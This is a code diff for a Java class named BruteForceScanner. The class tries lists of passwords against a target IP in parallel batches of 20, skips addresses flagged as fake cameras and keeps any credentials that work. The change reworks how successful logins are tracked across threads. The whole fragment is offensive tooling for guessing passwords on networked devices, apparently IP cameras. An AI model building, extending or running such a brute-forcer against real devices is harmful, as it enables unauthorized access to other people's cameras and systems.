@@ -12,29 +12,36 @@ import java.util.concurrent.*;
 public class BruteForceScanner {
 
     private final ExecutorService executorService = Executors.newFixedThreadPool(20);
-    volatile private AuthStateStore auth;
 
     @SneakyThrows
     public void brute(String ip, String[] passwords) {
-        auth = new AuthStateStore();
+        AuthStateStore auth = new AuthStateStore();
 
         if (IpBruteFilter.excludeFakeCamera(ip))
             return;
 
+        int successTryingCounter = 0;
         HashSet<BruteForceExecutor> requests = new HashSet<>();
         for (int i = 0; i < passwords.length; i++) {
-            if (auth.isAuth() && requests.size() > 1) {
+            if (auth.isAuth() && successTryingCounter > 1) {
                 auth.setCredentials(Optional.empty());
                 auth.setState(AuthState.NOT_REQUIRED);
                 break;
             }
 
-            requests.add(new BruteForceExecutor(ip, passwords[i], auth));
+            requests.add(new BruteForceExecutor(ip, passwords[i]));
             if (requests.size() == 20 || i == passwords.length - 1) {
-                List<Future<Void>> futures = executorService.invokeAll(requests, 2L, TimeUnit.SECONDS);
-                for (Future<Void> future : futures) {
+                List<Future<AuthStateStore>> futures = executorService.invokeAll(requests, 2L, TimeUnit.SECONDS);
+                for (Future<AuthStateStore> future : futures) {
                     try {
-                        future.get();
+                        AuthStateStore authNew = future.get();
+                        if (authNew.isAuth()) {
+                            if (!auth.isAuth()) {
+                                auth.setCredentials(authNew.getCredentials());
+                                auth.setState(authNew.getState());
+                            }
+                            successTryingCounter++;
+                        }
                     } catch (CancellationException | ExecutionException | InterruptedException ce) {
                         auth.setState(AuthState.NOT_AVAILABLE);
                         future.cancel(true);
